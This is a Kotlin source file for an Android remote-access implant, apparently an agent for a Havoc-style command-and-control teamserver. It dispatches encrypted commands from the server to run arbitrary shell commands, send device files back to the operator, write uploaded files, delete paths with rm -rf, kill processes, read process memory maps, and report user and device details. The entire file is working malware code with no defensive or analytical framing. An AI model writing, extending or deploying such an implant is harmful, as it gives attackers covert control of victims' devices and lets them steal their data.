package com.demon.agent.commands

import android.content.Context
import android.os.Build
import com.demon.agent.transport.*
import kotlinx.serialization.json.*
import java.io.File
import java.util.UUID

/*
 * CommandDispatcher.kt — Parses incoming job packets and executes commands.
 *
 * The teamserver sends jobs in the payload after decryption:
 *   [4] COMMAND_ID
 *   [4] REQUEST_ID
 *   [4] DATA_SIZE
 *   [N] command-specific data (AES encrypted — already decrypted by AgentSession)
 */
class CommandDispatcher(private val ctx: Context, private val session: AgentSession) {

    fun dispatch(cmdId: Int, reqId: Int, parser: PacketParser): ByteArray? {
        return when (cmdId) {
            CommandId.SLEEP        -> cmdSleep(reqId, parser)
            CommandId.EXIT         -> cmdExit(reqId)
            CommandId.FS           -> cmdFs(reqId, parser)
            CommandId.PROC_LIST     -> cmdProcList(reqId)
            0x1010                  -> cmdProcModule(reqId, parser)  // COMMAND_PROC module
            CommandId.TOKEN        -> cmdToken(reqId, parser)
            CommandId.COMMAND_NOJOB -> null  // heartbeat, no response needed
            else                   -> buildOutput(reqId, "Error",
                "Unknown command: 0x${cmdId.toString(16)}", "")
        }
    }

    // ── SLEEP ─────────────────────────────────────────────────────────
    private fun cmdSleep(reqId: Int, p: PacketParser): ByteArray {
        val delay  = p.readInt32()
        val jitter = p.readInt32()
        session.sleepDelay  = delay.coerceAtLeast(0)
        session.sleepJitter = jitter.coerceIn(0, 100)
        return buildOutput(reqId, "Good",
            "[*] Sleep set to ${delay}s jitter ${jitter}%", "")
    }

    // ── EXIT ──────────────────────────────────────────────────────────
    private fun cmdExit(reqId: Int): ByteArray {
        session.shouldExit = true
        return buildOutput(reqId, "Good", "[*] Agent exiting", "")
    }

    // ── FILE SYSTEM ───────────────────────────────────────────────────
    private fun cmdFs(reqId: Int, p: PacketParser): ByteArray {
        val sub = p.readInt32()
        return when (sub) {
            1  -> { // dir / ls
                val path = p.readString().ifBlank { "." }
                val out  = runShell("ls -la '$path' 2>&1")
                buildOutput(reqId, "Good", out, "")
            }
            4  -> { // cd
                val path = p.readString()
                try { System.setProperty("user.dir", path); buildOutput(reqId, "Good", "[+] cd $path", "") }
                catch (e: Exception) { buildOutput(reqId, "Error", "[-] ${e.message}", "") }
            }
            9  -> { // pwd
                val pwd = runShell("pwd")
                buildOutput(reqId, "Good", pwd, "")
            }
            10 -> { // cat
                val path = p.readString()
                val out  = runShell("cat '$path' 2>&1")
                buildOutput(reqId, "Good", out, "")
            }
            5  -> { // rm
                val path = p.readString()
                val out  = runShell("rm -rf '$path' 2>&1")
                buildOutput(reqId, "Good", out.ifBlank { "[+] Removed" }, "")
            }
            6  -> { // mkdir
                val path = p.readString()
                File(path).mkdirs()
                buildOutput(reqId, "Good", "[+] mkdir $path", "")
            }
            2  -> { // download (agent→teamserver)
                val path  = p.readString()
                val bytes = File(path).takeIf { it.exists() }?.readBytes()
                if (bytes != null) buildDownload(reqId, path, bytes)
                else buildOutput(reqId, "Error", "[-] File not found: $path", "")
            }
            3  -> { // upload (teamserver→agent)
                val path  = p.readString()
                val bytes = p.readBytes()
                File(path).writeBytes(bytes)
                buildOutput(reqId, "Good", "[+] Uploaded ${bytes.size} bytes to $path", "")
            }
            else -> {
                // Generic shell fallback
                val cmd = p.readString()
                buildOutput(reqId, "Good", runShell(cmd), "")
            }
        }
    }

    // ── PROCESS LIST ──────────────────────────────────────────────────
    private fun cmdProcList(reqId: Int): ByteArray {
        val out = runShell("ps -A 2>&1")
        return buildOutput(reqId, "Good", out, "")
    }

    // ── PROC MODULE (COMMAND_PROC = 0x1010) ───────────────────────────
    private fun cmdProcModule(reqId: Int, p: PacketParser): ByteArray {
        if (p.remaining < 4) {
            return buildOutput(reqId, "Good", runShell("ps -A 2>&1"), "")
        }

        return when (val sub = p.readInt32()) {

            // DEMON_COMMAND_PROC_LIST = 2
            1, 2 -> buildOutput(reqId, "Good", runShell("ps -A 2>&1"), "")

            // DEMON_COMMAND_PROC_CREATE = 4
            // Wire (little-endian, post-decrypt):
            //   [4]  ProcessState
            //   [4+N] Process     (UTF-16LE length-prefixed: "sh")
            //   [4+N] ProcessArgs (UTF-16LE length-prefixed: "/c whoami")
            //   [4]  ProcessPiped
            //   [4]  ProcessVerbose
            4 -> {
                val state        = p.readInt32()              // ProcessState (ignorar)
                val processBytes = p.readBytes()              // UTF-16LE bytes de "sh"
                val argsBytes    = p.readBytes()              // UTF-16LE bytes de "/c whoami"
                val piped        = if (p.remaining >= 4) p.readInt32() else 1
                val verbose      = if (p.remaining >= 4) p.readInt32() else 0

                // Decode UTF-16LE
                val process = processBytes.toString(Charsets.UTF_16LE).trimEnd('\u0000')
                val args    = argsBytes.toString(Charsets.UTF_16LE).trimEnd('\u0000')

                android.util.Log.d("AgentService",
                    "PROC_CREATE: process='$process' args='$args' piped=$piped verbose=$verbose")

                // Extract actual command: "/c whoami" → "whoami"
                val cmd = when {
                    args.startsWith("/c ", ignoreCase = true)  -> args.substring(3).trim()
                    args.startsWith("-c ", ignoreCase = true)  -> args.substring(3).trim()
                    args.isNotBlank()                          -> args.trim()
                    process.isNotBlank() && process != "sh"    -> process.trim()
                    else -> return buildOutput(reqId, "Error", "No command to execute", "")
                }

                android.util.Log.d("AgentService", "shell cmd: $cmd")
                val output = runShell(cmd)
                buildOutput(reqId, "Good", output.ifBlank { "(no output)" }, "")
            }

            // DEMON_COMMAND_PROC_GREP = 3
            // Wire: [4+N] pattern (UTF-16LE)
            3 -> {
                val patBytes = p.readBytes()
                val pattern  = patBytes.toString(Charsets.UTF_16LE).trimEnd('\u0000')
                val out = runShell("ps -A 2>&1 | grep -i '${pattern}'")
                buildOutput(reqId, "Good", out.ifBlank { "(no match for '$pattern')" }, "")
            }

            // DEMON_COMMAND_PROC_KILL = 7
            // Wire: [4] pid
            7 -> {
                if (p.remaining < 4) return buildOutput(reqId, "Error", "No PID specified", "")
                val pid = p.readInt32()
                val out = runShell("kill -9 $pid 2>&1").ifBlank { "[+] Killed PID $pid" }
                buildOutput(reqId, "Good", out, "")
            }

            // DEMON_COMMAND_PROC_MODULES = 2
            // DEMON_COMMAND_PROC_MEMORY = 6
            6 -> {
                val pid = if (p.remaining >= 4) p.readInt32()
                          else android.os.Process.myPid()
                buildOutput(reqId, "Good", runShell("cat /proc/$pid/maps 2>&1"), "")
            }

            else -> buildOutput(reqId, "Info",
                "proc sub=0x${sub.toString(16)} not implemented on Android", "")
        }
    }


    // ── TOKEN (getuid / whoami) ────────────────────────────────────────
    private fun cmdToken(reqId: Int, p: PacketParser): ByteArray {
        val sub = if (p.remaining >= 4) p.readString() else "getuid"
        val out = when (sub.lowercase().trim('\u0000')) {
            "getuid", "whoami", "" -> {
                val uid   = android.os.Process.myUid()
                val uname = runShell("id 2>&1").ifBlank {
                    "uid=$uid(u0_a${uid-10000}) gid=$uid"
                }
                val pkg   = ctx.packageName
                "$uname\nPackage: $pkg\nAndroid ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\nDevice: ${Build.MODEL}"
            }
            "list"   -> "Token list not applicable on Android"
            "privs-list" -> runShell("cat /proc/self/status 2>&1")
            else     -> "Unknown token sub-command: '$sub'"
        }
        return buildOutput(reqId, "Good", out, "")
    }

    // ── Helpers ───────────────────────────────────────────────────────

    private fun runShell(cmd: String, timeoutMs: Long = 10_000): String {
        return try {
            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))

            // Read stdout and stderr concurrently to avoid deadlock
            val stdoutFuture = java.util.concurrent.FutureTask {
                proc.inputStream.bufferedReader().use { it.readText() }
            }.also { java.util.concurrent.Executors.newSingleThreadExecutor().submit(it) }

            val stderrFuture = java.util.concurrent.FutureTask {
                proc.errorStream.bufferedReader().use { it.readText() }
            }.also { java.util.concurrent.Executors.newSingleThreadExecutor().submit(it) }

            val finished = proc.waitFor(timeoutMs, java.util.concurrent.TimeUnit.MILLISECONDS)
            if (!finished) {
                proc.destroyForcibly()
                return "[!] Command timed out after ${timeoutMs}ms"
            }

            val out = try { stdoutFuture.get(2, java.util.concurrent.TimeUnit.SECONDS) } catch (e: Exception) { "" }
            val err = try { stderrFuture.get(2, java.util.concurrent.TimeUnit.SECONDS) } catch (e: Exception) { "" }

            // Truncate to avoid OOM with huge outputs
            val combined = (out + err).trim()
            if (combined.length > 32_768) combined.take(32_768) + "\n[...truncated]"
            else combined
        } catch (e: Exception) {
            "Error executing command: ${e.message}"
        }
    }

    /*
     * Build a BEACON_OUTPUT packet:
     *   The output is a base64-encoded JSON:
     *   { "Type": "Good|Info|Error|Warn", "Message": "...", "Output": "..." }
     */
    fun buildOutput(reqId: Int, type: String, message: String, output: String): ByteArray {
        val json = buildJsonObject {
            put("Type",    type)
            put("Message", message)
            put("Output",  output)
        }.toString()
        val b64 = android.util.Base64.encodeToString(
            json.toByteArray(Charsets.UTF_8), android.util.Base64.NO_WRAP)

        // Payload = length-prefixed base64 string
        val payload = PacketBuilder().addString(b64).build()
        return FrameBuilder.buildOutput(
            agentId   = session.agentId,
            commandId = CommandId.BEACON_OUTPUT,
            requestId = reqId,
            payload   = payload,
            aesKey    = session.aesKey,
            aesIv     = session.aesIv,
        )
    }

    private fun buildDownload(reqId: Int, path: String, data: ByteArray): ByteArray {
        val payload = PacketBuilder()
            .addInt32(2)  // DEMON_COMMAND_FS_DOWNLOAD
            .addString(path)
            .addBytes(data)
            .build()
        return FrameBuilder.buildOutput(
            agentId   = session.agentId,
            commandId = CommandId.FS,
            requestId = reqId,
            payload   = payload,
            aesKey    = session.aesKey,
            aesIv     = session.aesIv,
        )
    }
}

// ── Session state shared between dispatcher and service ───────────────
class AgentSession {
    var agentId:     Int      = generateAgentId()
    var aesKey:      ByteArray = randomBytes(32)
    var aesIv:       ByteArray = randomBytes(16)
    var sleepDelay:  Int      = 5
    var sleepJitter: Int      = 10
    var shouldExit:  Boolean  = false
}
